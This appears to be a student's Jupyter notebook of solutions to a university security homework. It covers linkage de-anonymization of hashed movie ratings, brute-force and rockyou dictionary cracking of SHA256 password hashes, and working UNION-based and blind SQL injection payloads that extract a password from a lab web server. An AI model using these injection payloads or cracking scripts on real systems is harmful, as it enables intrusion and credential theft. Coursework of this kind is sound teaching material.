{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 1: Find out about your favorite movies\n",
    "\n",
    "In this exercise you have to\n",
    "de-anonymize the dedis-database that holds your secret movie-ratings.\n",
    "\n",
    "The database is\n",
    "given to you as a csv-file with the following format:\n",
    "\n",
    "`sha256(salt | email), sha256(salt | movie), date, rating`\n",
    "\n",
    "The salt is the same for the whole database. There are 189 emails that correspond to the\n",
    "students and teachers of COM-402. Your goal is to find out what movies you rated in the\n",
    "dedis-database.\n",
    "\n",
    "To de-anonymize the list, you get a second csv-file from IMDb in the format below. This\n",
    "second list is smaller than the first list.\n",
    "`email, movie, date, rating`\n",
    "\n",
    "For all sub-exercises, the entries in the IMDb are a strict subset of the entries in the\n",
    "dedis-database.\n",
    "\n",
    "The exercise has 3 sets of csv-files (`dedis-db` and `IMDb-db`), with increasing difficulty to\n",
    "recover the movies you rated:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1 Dates are giving it away - each user rated the movie at the same date in both `dedis-db` and `IMDb-db`.\n",
    "\n",
    "_**Hint**: some dates might have more than one rating, so you need to make sure you remove these doubles._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "\n",
    "col_names = {\"imdb\": [\"email\", \"movie\", \"date\", \"rating\"],\n",
    "    \"dedis\": [\"salted-email\", \"salted-movie\", \"date\", \"rating\"]}\n",
    "\n",
    "lu_email = \"lucia.monterosanchis@epfl.ch\"\n",
    "\n",
    "data = {}\n",
    "for i in range(1,4):\n",
    "    for ds in [\"dedis\", \"imdb\"]:\n",
    "        name = \"{}-{}\".format(ds, i)\n",
    "        data[name] = pd.read_csv(\"Lucia_MonteroSanchis_259236/hw3_ex1_{}/{}.csv\".format(lu_email, name),\n",
    "            skipinitialspace=True, quotechar='\"', names=col_names[ds])\n",
    "\n",
    "data_i = data[\"imdb-1\"].copy()\n",
    "data_d = data[\"dedis-1\"].copy()\n",
    "movies = {}  # Dictionary with salted and unsalted movies\n",
    "emails = {}  # Dictionary with salted and unsalted emails\n",
    "\n",
    "# 1. Group imdb data by email\n",
    "grouped_i = data_i.groupby(\"email\")\n",
    "\n",
    "# 2. Group dedis data by salted email\n",
    "grouped_d = data_d.groupby(\"salted-email\")\n",
    "\n",
    "# 3. Iterate over each unique salted email in dedis, and unique email in imdb\n",
    "seen_emails = []  # to check if there are duplicates!\n",
    "for g_d in grouped_d:\n",
    "    # get set of dates\n",
    "    dates_d = set(g_d[1][\"date\"])\n",
    "    for g_i in grouped_i:\n",
    "        # get set of dates\n",
    "        dates_i = set(g_i[1][\"date\"])\n",
    "        # 3.1 check if the imdb dates is subset of dedis dates\n",
    "        if dates_i.issubset(dates_d):\n",
    "            # they're the same user!\n",
    "            seen_emails.append(g_i[0])  # to check if there are duplicates\n",
    "            # 3.2 add email and salted email to dictionary\n",
    "            emails[g_i[0]] = g_d[0]\n",
    "            # 3.3 join on date to get salted movie names related to unsalted\n",
    "            combined_df = g_d[1].join(g_i[1].set_index(g_i[1][\"date\"]),\n",
    "                on=\"date\", how=\"inner\", lsuffix='_left', rsuffix='_right')\n",
    "            # 3.4 update the movies dictionary with the new findings\n",
    "            movies.update(dict(zip(combined_df[\"salted-movie\"],\n",
    "                combined_df[\"movie\"])))\n",
    "\n",
    "# just in case...\n",
    "if(len(seen_emails) - len(set(seen_emails))):\n",
    "    print(\"There were duplicates!!!\")\n",
    "\n",
    "# 4. Save file with my movie ratings\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/1a.txt','w')\n",
    "for m in grouped_d.get_group(emails[lu_email])[\"salted-movie\"]:\n",
    "    f.write(movies[m])\n",
    "    f.write('\\n')\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2 The dates are random, reflecting the fact that you won’t rate a movie the same day with Netflix and the IMDb. However, a simple frequency-attack on the movies is enough to map the movies to the hashes, then you’ll have to fit the IMDb with the dedis-database.\n",
    "\n",
    "_**Hint**: Once you mapped the hashes of the movies to the plain names of the movies, search for any user who rated all films you find in its public ratings._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "\n",
    "col_names = {\"imdb\": [\"email\", \"movie\", \"date\", \"rating\"],\n",
    "    \"dedis\": [\"salted-email\", \"salted-movie\", \"date\", \"rating\"]}\n",
    "\n",
    "lu_email = \"lucia.monterosanchis@epfl.ch\"\n",
    "\n",
    "data = {}\n",
    "for i in range(1,4):\n",
    "    for ds in [\"dedis\", \"imdb\"]:\n",
    "        name = \"{}-{}\".format(ds, i)\n",
    "        data[name] = pd.read_csv(\"Lucia_MonteroSanchis_259236/hw3_ex1_{}/{}.csv\".format(lu_email, name),\n",
    "            skipinitialspace=True, quotechar='\"', names=col_names[ds])\n",
    "\n",
    "data_i = data[\"imdb-2\"].copy()\n",
    "data_d = data[\"dedis-2\"].copy()\n",
    "\n",
    "def update(dictionary, k, v):\n",
    "    \"\"\"Function used to add a new sample to an existing dictionary.\n",
    "    If key k is already defined it appends value v to k's list\n",
    "    If key k is not defined, associates it with a singleton list\n",
    "        containing v.\n",
    "    \"\"\"\n",
    "    if k in dictionary.keys():\n",
    "        dictionary[k].append(v)\n",
    "    else:\n",
    "        dictionary[k] = [v]\n",
    "\n",
    "# 1. Group imdb data by movie and by email\n",
    "grouped_u_i = data_i.groupby(\"email\")\n",
    "grouped_m_i = data_i.groupby(\"movie\")\n",
    "\n",
    "# 2. Group dedis data by salted movie and by email\n",
    "grouped_u_d = data_d.groupby(\"salted-email\")\n",
    "grouped_m_d = data_d.groupby(\"salted-movie\")\n",
    "\n",
    "# 3. Create dictionary mapping movie names and freqs of appearance\n",
    "count_m_i = grouped_m_i['email'].count().to_dict()\n",
    "count_m_d = grouped_m_d['salted-email'].count().to_dict()\n",
    "\n",
    "# 4. Sort dictionaries by freqs of appearance and do the mapping\n",
    "import operator\n",
    "sorted_i = sorted(count_m_i.items(), key=operator.itemgetter(1))\n",
    "sorted_d = sorted(count_m_d.items(), key=operator.itemgetter(1))\n",
    "\n",
    "movies = {ed[0]: ei[0] for (ei, ed) in zip(sorted_i, sorted_d)}\n",
    "\n",
    "# 5. Iterate over each unique salted email in dedis, and unique email in imdb\n",
    "emails = {}\n",
    "for g_d in grouped_u_d:\n",
    "    movies_d = set(g_d[1][\"salted-movie\"])\n",
    "    movies_d_unsalted = {movies[m] for m in movies_d}\n",
    "    for g_i in grouped_u_i:\n",
    "        movies_i = set(g_i[1][\"movie\"])\n",
    "        # 5.1 check if imdb movies is subset of dedis movies\n",
    "        if movies_i.issubset(movies_d_unsalted):\n",
    "            # 5.2 add email and salted email to dictionary\n",
    "            update(emails, g_i[0], g_d[0])\n",
    "\n",
    "# 6. Save file with my movie ratings\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/1b.txt','w')\n",
    "for m in grouped_u_d.get_group(emails[lu_email][0])[\"salted-movie\"]:\n",
    "    f.write(movies[m])\n",
    "    f.write('\\n')\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3 More realistic database\n",
    "Dates of ratings in dedis-database and IMDb are not the\n",
    "same, but similar. Dates are within 14 days, with a triangular distribution, using\n",
    "python’s random.choices  and a weight of [1, 2, 3, …, 14, 13, 12, …, 1].\n",
    "\n",
    "_**Hint**: First search for user-name hash/plaintext overlap and fit those to find the hash\n",
    "of your email. Then you can search for the closest overlap of the public ratings and\n",
    "the anonymous ratings of your email._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aurelien.monbaron@epfl.ch: 0.42857142857142855\n",
      "Jeremy.Corcoba@unil.ch: 1.0\n"
     ]
    }
   ],
   "source": [
    "import pandas as pd\n",
    "\n",
    "col_names = {\"imdb\": [\"email\", \"movie\", \"date\", \"rating\"],\n",
    "    \"dedis\": [\"salted-email\", \"salted-movie\", \"date\", \"rating\"]}\n",
    "\n",
    "lu_email = \"lucia.monterosanchis@epfl.ch\"\n",
    "\n",
    "data = {}\n",
    "for i in range(1,4):\n",
    "    for ds in [\"dedis\", \"imdb\"]:\n",
    "        name = \"{}-{}\".format(ds, i)\n",
    "        data[name] = pd.read_csv(\"Lucia_MonteroSanchis_259236/hw3_ex1_{}/{}.csv\".format(lu_email, name),\n",
    "            skipinitialspace=True, quotechar='\"', names=col_names[ds])\n",
    "\n",
    "data_i = data[\"imdb-3\"].copy()\n",
    "data_d = data[\"dedis-3\"].copy()\n",
    "\n",
    "def update(dictionary, k, v):\n",
    "    \"\"\"Function used to add a new sample to an existing dictionary.\n",
    "    If key k is already defined it appends value v to k's list\n",
    "    If key k is not defined, associates it with a singleton list\n",
    "        containing v.\n",
    "    \"\"\"\n",
    "    if k in dictionary.keys():\n",
    "        dictionary[k].append(v)\n",
    "    else:\n",
    "        dictionary[k] = [v]\n",
    "\n",
    "# 1. Group imdb data by movie and by email\n",
    "grouped_u_i = data_i.groupby(\"email\")\n",
    "grouped_m_i = data_i.groupby(\"movie\")\n",
    "\n",
    "# 2. Group dedis data by salted movie and by email\n",
    "grouped_u_d = data_d.groupby(\"salted-email\")\n",
    "grouped_m_d = data_d.groupby(\"salted-movie\")\n",
    "\n",
    "# 3.1 Define function for next step\n",
    "def check_dates(dates_i, dates_d):\n",
    "    \"\"\"Iterates over dates_i and dates_d.\n",
    "    Checks if for each d_i in dates_i there is at least one\n",
    "    date in dates_d so that both are within 14 days.\n",
    "    \"\"\"\n",
    "    for d_i in dates_i:\n",
    "        if not find_close_date(d_i, dates_d):\n",
    "            return False\n",
    "    else:\n",
    "        return True\n",
    "    \n",
    "def make_date(d, separator=\"/\"):\n",
    "    \"\"\"Transform string into date object\"\"\"\n",
    "    from datetime import date\n",
    "    d_v = d.split(separator)\n",
    "    return date(int('20'+d_v[2]), int(d_v[1]), int(d_v[0]))\n",
    "\n",
    "def find_close_date(d_i, dates_d, close=14):\n",
    "    \"\"\"Returns True if theres a date close to d_i in dates_d\"\"\"\n",
    "    f_d_i = make_date(d_i)\n",
    "    for d_d in dates_d:\n",
    "        f_d_d = make_date(d_d)\n",
    "        delta = f_d_i - f_d_d\n",
    "        if abs(delta.days) <= close:\n",
    "            return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "# 3.2 Iterate over each salted movie in dedis, and movie in imdb\n",
    "# creating a dictionary of movie and hashed movie pairs\n",
    "movies = {}\n",
    "missing_movies = []\n",
    "for g_i in grouped_m_i:\n",
    "    dates_i = g_i[1][\"date\"]\n",
    "    for g_d in grouped_m_d:\n",
    "        dates_d = g_d[1][\"date\"]\n",
    "        if check_dates(dates_i, dates_d):\n",
    "            movies[g_d[0]] = g_i[0]\n",
    "            break\n",
    "    else:\n",
    "        missing_movies.append(g_i[0])\n",
    "\n",
    "# 3.3 Get the hashed titles for the missing movies\n",
    "missing_salted_movies = [g_d[0] for g_d in grouped_m_d\n",
    "    if g_d[0] not in movies.keys()]\n",
    "\n",
    "# 4 Get the missing movies\n",
    "# 4.1 Find user movies\n",
    "movies_d_unsalted = []\n",
    "u_movies = {}\n",
    "emails = {}\n",
    "for g_i in grouped_u_i:\n",
    "    movies_i = set(g_i[1][\"movie\"])\n",
    "    for g_d in grouped_u_d:\n",
    "        movies_d = list(g_d[1][\"salted-movie\"])\n",
    "        movies_d_unsalted = [movies[m] for m in movies_d if m in movies]\n",
    "        if movies_i.issubset(movies_d_unsalted):\n",
    "            emails[g_d[0]] = g_i[0]\n",
    "            if (len(movies_d_unsalted) - len(movies_d)):\n",
    "                u_movies[g_d[0]] = set(movies_d) - set(movies.keys())\n",
    "\n",
    "# 4.2 try with the users we mapped\n",
    "for m in missing_movies:\n",
    "    for h_m in missing_salted_movies:\n",
    "        for h_e, e in emails.items():\n",
    "            gd = grouped_u_d.get_group(h_e)[\"salted-movie\"]\n",
    "            if h_m in list(gd):\n",
    "                gi = grouped_u_i.get_group(e)[\"movie\"]\n",
    "                if m in list(gi):\n",
    "                    print(\":)\")\n",
    "                    \n",
    "# 4.3 The previous didn't work! need to map some more users...\n",
    "users_list = list([g[0] for g in grouped_u_i if g[0] not in emails.values()])\n",
    "h_users_list = list([g[0] for g in grouped_u_d if g[0] not in emails])\n",
    "\n",
    "# 4.3.1 I'll keep only the ones who voted some missing movie\n",
    "users_list_= [u for u in users_list if missing_movies[0]\n",
    "    in list(grouped_u_i.get_group(u)[\"movie\"])]\n",
    "\n",
    "# 4.3.2 and I remove the ones who also voted the other missing movie\n",
    "users_list = [u for u in users_list_ if missing_movies[1]\n",
    "    not in list(grouped_u_i.get_group(u)[\"movie\"])]\n",
    "\n",
    "# 4.3.3 and I do the same with the dedis data\n",
    "h_users_list_ = [u for u in h_users_list if missing_salted_movies[0]\n",
    "    in list(grouped_u_d.get_group(u)[\"salted-movie\"])]\n",
    "\n",
    "h_users_list_0 = [u for u in h_users_list_ if missing_salted_movies[1]\n",
    "    not in list(grouped_u_d.get_group(u)[\"salted-movie\"])]\n",
    "\n",
    "h_users_list_ = [u for u in h_users_list if missing_salted_movies[1]\n",
    "    in list(grouped_u_d.get_group(u)[\"salted-movie\"])]\n",
    "\n",
    "h_users_list_1 = [u for u in h_users_list_ if missing_salted_movies[0]\n",
    "    not in list(grouped_u_d.get_group(u)[\"salted-movie\"])]\n",
    "\n",
    "# 4.3.4 now I try to map someone in h_users_list_0\n",
    "# with someone in users_list\n",
    "inv_movies = {v: k for k, v in movies.items()}\n",
    "\n",
    "h_candidate = h_users_list_0[0]\n",
    "h_movies_cand = grouped_u_d.get_group(h_candidate)\n",
    "c_dates_0 = {}\n",
    "\n",
    "for c_i in users_list:\n",
    "    movies_cand = grouped_u_i.get_group(c_i)\n",
    "    x = [inv_movies[m] in list(h_movies_cand[\"salted-movie\"]) for m in movies_cand[\"movie\"]\n",
    "        if m in inv_movies]\n",
    "    c_dates_0[c_i] = x.count(True) / (x.count(True) + x.count(False))\n",
    "\n",
    "# I keep the best mapping for h_users_list_0\n",
    "import operator\n",
    "max_arg_0 = max(c_dates_0.items(), key=operator.itemgetter(1))[0]\n",
    "print(\"{}: {}\".format(max_arg_0, c_dates_0[max_arg_0]))\n",
    "\n",
    "# 4.3.5 now I try to map someone in h_users_list_1\n",
    "# with someone in users_list\n",
    "inv_movies = {v: k for k, v in movies.items()}\n",
    "\n",
    "h_candidate = h_users_list_1[0]\n",
    "h_movies_cand = grouped_u_d.get_group(h_candidate)\n",
    "c_dates_1 = {}\n",
    "\n",
    "for c_i in users_list:\n",
    "    movies_cand = grouped_u_i.get_group(c_i)\n",
    "    x = [inv_movies[m] in list(h_movies_cand[\"salted-movie\"]) for m in movies_cand[\"movie\"]\n",
    "        if m in inv_movies]\n",
    "    c_dates_1[c_i] = x.count(True) / (x.count(True) + x.count(False))\n",
    "\n",
    "# I keep the best mapping for h_users_list_1\n",
    "max_arg_1 = max(c_dates_1.items(), key=operator.itemgetter(1))[0]\n",
    "print(\"{}: {}\".format(max_arg_1, c_dates_1[max_arg_1]))\n",
    "\n",
    "# 4.3.6 I compare the results for the two best mappings I got before\n",
    "\n",
    "candidate = None\n",
    "\n",
    "if c_dates_0[max_arg_0] > c_dates_1[max_arg_1]:\n",
    "    candidate = max_arg_0\n",
    "else:\n",
    "    candidate = max_arg_1\n",
    "\n",
    "# I was able to match Jeremy.Corcoba@unil.ch!\n",
    "\n",
    "# 4.4 Now I use his ratings to find the missing matches and    \n",
    "# add the found movie to 'movies'\n",
    "movies[[hm for hm in grouped_u_d.get_group(h_candidate)[\"salted-movie\"]\n",
    "    if hm not in movies][0]] = [m for m in grouped_u_i.get_group(candidate)[\"movie\"]\n",
    "    if m not in inv_movies][0]\n",
    "\n",
    "movies[[hm for hm in missing_salted_movies if hm not in movies.keys()][0]] = [m\n",
    "    for m in missing_movies if m not in movies.values()][0]\n",
    "\n",
    "# 5 Find my movies\n",
    "movies_d_unsalted = []\n",
    "movies_i = set(grouped_u_i.get_group(lu_email)[\"movie\"])\n",
    "lu_movies_salted = []\n",
    "lu_movies = []\n",
    "for g_d in grouped_u_d:\n",
    "    movies_d = g_d[1][\"salted-movie\"]\n",
    "    movies_d_unsalted = {movies[m] for m in movies_d if m in movies}\n",
    "    if movies_i.issubset(movies_d_unsalted):\n",
    "        lu_movies = movies_d_unsalted\n",
    "        lu_movies_salted = movies_d\n",
    "        if not len(lu_movies) == len(lu_movies_salted):\n",
    "            print(\"{} movie(s) missing!\".format(len(lu_movies_salted) - len(lu_movies)))\n",
    "            \n",
    "# 6 Save file with my movie ratings\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/1c.txt','w')\n",
    "for m in lu_movies:\n",
    "    f.write(m)\n",
    "    f.write('\\n')\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "# Exercise 2: L33t hax0r5\n",
    "\n",
    "In the txt file you will find 10 password hashes for each part of\n",
    "the exercise. Your goal is to crack those hashes and reveal the passwords."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1 Brute force\n",
    "In this part you should implement a brute-force attack. Passwords are randomly generated\n",
    "from the set of lowercase letters and digits (‘abcd...xyz0123...9’) and have length 4, 5, or 6\n",
    "characters. Generated passwords are then hashed with SHA256 and corresponding\n",
    "hexdigests are sent to you in the file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Read file\n",
    "with open(\"Lucia_MonteroSanchis_259236/hw3_ex2.txt\") as f:\n",
    "    content = f.readlines()\n",
    "\n",
    "# remove whitespace characters at the end of each line\n",
    "content = [x.strip() for x in content]\n",
    "\n",
    "# Get strings for this exercise\n",
    "ex2a = content[1:11]\n",
    "\n",
    "import string\n",
    "\n",
    "# Generate set of possible characters\n",
    "chars = string.digits + string.ascii_lowercase\n",
    "\n",
    "import itertools\n",
    "import hashlib\n",
    "\n",
    "# Dictionary to store the found passwords\n",
    "found_pwd = {}\n",
    "\n",
    "# Check all possible combinations of characters\n",
    "for length in range(4,7):\n",
    "    for w in map(''.join, itertools.product(*[chars]*length)):\n",
    "        # get hash\n",
    "        hashed_w = hashlib.sha256(w.encode('utf-8')).hexdigest()\n",
    "        # compare\n",
    "        if hashed_w in ex2a:\n",
    "            found_pwd[hashed_w] = w\n",
    "            print(w)\n",
    "        if len(found_pwd) >= 10:\n",
    "            break\n",
    "    if len(found_pwd) >= 10:\n",
    "        break\n",
    "\n",
    "# Save file with the found passwords\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/2a.txt','w')\n",
    "f.write(found_pwd[ex2a[0]])\n",
    "for k in ex2a[1:]:\n",
    "    f.write(', ')\n",
    "    f.write(found_pwd[k])\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2 Dictionary attack with rules\n",
    "In this part you should\n",
    "implement a dictionary attack. We generate a password by selecting a word from a\n",
    "large dictionary and then randomly applying some of the common user modifications:\n",
    "- capitalize the first letter and every letter which comes after a digit. For example, `com402dedis` becomes `Com402Dedis`. This is achieved by `title()`, e.g. `'com402dedis'.title()`\n",
    "- change `e` to `3`\n",
    "- change `o` to `0`\n",
    "- change `i` to `1`\n",
    "\n",
    "In the file you received you will find the SHA256 hexdigests of passwords generated in this\n",
    "way. Your task is to crack them using a dictionary attack.\n",
    "Dictionaries can be found online (e.g. https://wiki.skullsecurity.org/Passwords).\n",
    "\n",
    "_**Note 1**: the words we used to generate passwords only contain uppercase and lowercase letters and digits._\n",
    "\n",
    "_**Note 2**: Not all dictionaries are the same, be aware that if you implement the attack correctly\n",
    "but you can't crack the passwords, then you might be using a dictionary which doesn't\n",
    "contain all the words as the dictionary we used._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# 1. Read file\n",
    "with open(\"Lucia_MonteroSanchis_259236/hw3_ex2.txt\") as f:\n",
    "    content = f.readlines()\n",
    "# you may also want to remove whitespace characters like `\\n` at the end of each line\n",
    "content = [x.strip() for x in content]\n",
    "\n",
    "# 2. Get strings for this exercise\n",
    "ex2b = content[12:22]\n",
    "\n",
    "import string\n",
    "\n",
    "# 3. Generate set of possible characters\n",
    "chars = string.digits + string.ascii_lowercase + string.ascii_uppercase\n",
    "\n",
    "# 4. Define rules\n",
    "def change(string, nb):\n",
    "    if nb == 0:\n",
    "        return string.title()\n",
    "    elif nb == 1:\n",
    "        return string.replace(\"e\", \"3\").replace(\"E\", \"3\")\n",
    "    elif nb == 2:\n",
    "        return string.replace(\"o\", \"0\").replace(\"O\", \"0\")\n",
    "    else:\n",
    "        return string.replace(\"i\", \"1\").replace(\"I\", \"1\")\n",
    "\n",
    "# Dictionary to store found passwords\n",
    "found_pwd = {}\n",
    "\n",
    "# 5. Load dictionary\n",
    "import bz2\n",
    "\n",
    "dictionary = set()\n",
    "with bz2.open(\"rockyou.txt.bz2\", \"rt\", encoding=\"ISO-8859-1\") as bz_file:\n",
    "    for line in bz_file:\n",
    "        word = line.rstrip()\n",
    "        if all(char in chars for char in word):\n",
    "            dictionary.add(word)\n",
    "\n",
    "# 6. Iterate through the dictionary, applying all possible modifications\n",
    "import hashlib\n",
    "\n",
    "for w in dictionary:\n",
    "    for w_0 in [w, change(w, 0)]:\n",
    "        for w_1 in [w_0, change(w_0, 1)]:\n",
    "            for w_2 in [w_1, change(w_1, 2)]:\n",
    "                for w_3 in [w_2, change(w_2, 3)]:\n",
    "                    # check if w_3 is in passwords\n",
    "                    h_w = hashlib.sha256(w_3.encode('utf-8')).hexdigest()\n",
    "                    if h_w in ex2b:\n",
    "                        found_pwd[h_w] = w_3\n",
    "                        print(w_3)\n",
    "                    if len(found_pwd) >= 10:\n",
    "                        break\n",
    "                if len(found_pwd) >= 10:\n",
    "                    break\n",
    "            if len(found_pwd) >= 10:\n",
    "                break\n",
    "        if len(found_pwd) >= 10:\n",
    "            break\n",
    "    if len(found_pwd) >= 10:\n",
    "        break\n",
    "\n",
    "# 7. Save file with the found passwords\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/2b.txt','w')\n",
    "f.write(found_pwd[ex2b[0]])\n",
    "for k in ex2b[1:]:\n",
    "    f.write(', ')\n",
    "    f.write(found_pwd[k])\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3 Dictionary attack with salt\n",
    "Once you have a dictionary you can compute the hashes of all those words in it, and\n",
    "create a lookup table. This way, each next password you want to crack is nothing more than\n",
    "a query in the lookup table. Because of this, passwords are usually ‘salted’ before hashing.\n",
    "\n",
    "In this part of the exercise you should implement another attack using a dictionary. We\n",
    "generate a password by simply selecting a random word from a dictionary and appending a\n",
    "random salt to it. The password is then hashed with SHA256 and hexdigest and salt are sent\n",
    "to you in the file. Your task is to crack the passwords using a dictionary.\n",
    "\n",
    "_**Note**: Salt is exactly two characters long and it contains only hexadecimal characters._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# 1. Read file\n",
    "with open(\"Lucia_MonteroSanchis_259236/hw3_ex2.txt\") as f:\n",
    "    content = f.readlines()\n",
    "# you may also want to remove whitespace characters like `\\n` at the end of each line\n",
    "content = [x.strip() for x in content]\n",
    "\n",
    "# 2. Get data for this exercise\n",
    "ex2c_s = [c.split(\", \")[0] for c in content[23:]]\n",
    "ex2c_p = [c.split(\", \")[1] for c in content[23:]]\n",
    "\n",
    "import string\n",
    "\n",
    "# 3. Generate set of possible characters\n",
    "chars = string.digits + string.ascii_lowercase + string.ascii_uppercase\n",
    "\n",
    "# 4. Load dictionary\n",
    "import bz2\n",
    "\n",
    "dictionary = set()\n",
    "with bz2.open(\"rockyou.txt.bz2\", \"rt\", encoding=\"ISO-8859-1\") as bz_file:\n",
    "    for line in bz_file:\n",
    "        word = line.rstrip()\n",
    "        if all(char in chars for char in word):\n",
    "            dictionary.add(word)\n",
    "            \n",
    "# Dictionary to store found passwords\n",
    "found_pwd = {}\n",
    "\n",
    "# 6. Iterate through the dictionary\n",
    "# append all possible salts, then hash and compare to the pwds\n",
    "import hashlib\n",
    "\n",
    "for w in dictionary:\n",
    "    for s in ex2c_s:\n",
    "        w_s = w+s\n",
    "        h_w = hashlib.sha256(w_s.encode('utf-8')).hexdigest()\n",
    "        if h_w in ex2c_p:\n",
    "            found_pwd[h_w] = w\n",
    "            print(w)\n",
    "        if len(found_pwd) >= 10:\n",
    "            break\n",
    "    if len(found_pwd) >= 10:\n",
    "        break\n",
    "\n",
    "# 7. Save file with the found passwords\n",
    "f = open('Lucia_MonteroSanchis_259236/solutions/2c.txt','w')\n",
    "f.write(found_pwd[ex2c_p[0]])\n",
    "for k in ex2c_p[1:]:\n",
    "    f.write(', ')\n",
    "    f.write(found_pwd[k])\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Well, that site smells like some SQL injections are possible Look at `/root/startup.sh` to see how the SQL schema looks like!\n"
     ]
    }
   ],
   "source": [
    "import base64\n",
    "x = \"V2VsbCwgdGhhdCBzaXRlIHNtZWxscyBsaWtlIHNvbWUgU1FMIGluamVjdGlvbnMgYXJlIHBvc3NpYmxlIExvb2sgYXQgYC9yb290L3N0YXJ0dXAuc2hgIHRvIHNlZSBob3cgdGhlIFNRTCBzY2hlbWEgbG9va3MgbGlrZSE=\"\n",
    "print(base64.b64decode(x).decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should try requesting both valid and invalid SQL queries and check their output."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You don’t always need a form for SQL injections ;)\n"
     ]
    }
   ],
   "source": [
    "x = \"089 111 117 032 100 111 110 226 128 153 116 032 097 108 119 097 121 115 032 110 101 101 100 032 097 032 102 111 114 109 032 102 111 114 032 083 081 076 032 105 110 106 101 099 116 105 111 110 115 032 059 041\"\n",
    "x = x.split(\" \")\n",
    "x = ''.join([format(int(i), '02x') for i in x])\n",
    "print(bytearray.fromhex(x).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "mahoney verde athena pershing hegelian lucas schlegel lazarus chopin orpheus\n"
     ]
    }
   ],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "import json\n",
    "import requests\n",
    "\n",
    "url = \"http://172.17.0.2/personalities?id=1' union all select mail, message from contact_messages where mail='james@bond.mi5\"\n",
    "\n",
    "response = requests.get(url)\n",
    "\n",
    "soup = BeautifulSoup(response.content, 'html.parser')\n",
    "x = soup.body.find_all('a')\n",
    "print(x[1].contents[0].split(':')[1])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3b"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should try requesting both valid and invalid SQL queries and check their output."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "868c39d2ef916de\n"
     ]
    }
   ],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "import json\n",
    "import requests\n",
    "\n",
    "url = \"http://172.17.0.2/messages\"\n",
    "headers = headers = {'Content-Type': \"application/x-www-form-urlencoded\"}\n",
    "\n",
    "def analyze_response(response):\n",
    "    soup = BeautifulSoup(response.content, 'html.parser')\n",
    "    if '200' in str(response):\n",
    "        if \"The name exists !\" in str(soup.body):\n",
    "            return 0\n",
    "        else:\n",
    "            return 1\n",
    "    else:\n",
    "        print(soup.prettify())\n",
    "        return 2\n",
    "\n",
    "# get password length\n",
    "for length in range(100):\n",
    "    payload = \"name=0' union all select password, password from users where CHAR_LENGTH(password)={} and name='inspector_derrick\".format(length)\n",
    "    response = requests.post(url, data=payload, headers=headers)\n",
    "    result = analyze_response(response)\n",
    "    if not result:\n",
    "        break\n",
    "\n",
    "import string\n",
    "\n",
    "# Generate set of some characters\n",
    "chars = string.digits + string.ascii_lowercase + string.ascii_uppercase\n",
    "\n",
    "# get password length\n",
    "pwd_chars = []\n",
    "\n",
    "for c in chars:\n",
    "    payload = \"name=0' union all select password, password from users where password like '%{}%' and name='inspector_derrick\".format(c)\n",
    "    response = requests.post(url, data=payload, headers=headers)\n",
    "    result = analyze_response(response)\n",
    "    if not result:\n",
    "        pwd_chars.append(c)\n",
    "\n",
    "ordered_char = []\n",
    "for i in range(length):\n",
    "    for c in pwd_chars:\n",
    "        payload = \"name=0' union all select password, password from users where password like '{}{}%' and name='inspector_derrick\".format(''.join(ordered_char), c)\n",
    "        response = requests.post(url, data=payload, headers=headers)\n",
    "        result = analyze_response(response)\n",
    "        if not result:\n",
    "            ordered_char.append(c)\n",
    "print(''.join(ordered_char))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
